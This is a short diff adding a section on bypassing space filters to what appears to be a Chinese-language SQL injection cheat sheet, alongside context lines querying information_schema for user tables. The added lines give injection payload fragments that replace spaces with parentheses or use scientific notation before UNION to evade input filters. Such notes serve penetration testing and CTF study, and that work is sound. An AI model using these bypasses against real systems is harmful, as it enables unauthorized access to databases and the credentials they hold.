@@ -165,6 +165,15 @@ SELECT table_name FROM information_schema.columns WHERE column_name = 'username'
 SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
 ```
 
+### 绕过空格限制
+
+```sql
+-- 括号
+select(username)from(admin)
+-- 科学记数法
+where username=1e0union select
+```
+
 ### 绕过引号限制
 
 ```sql
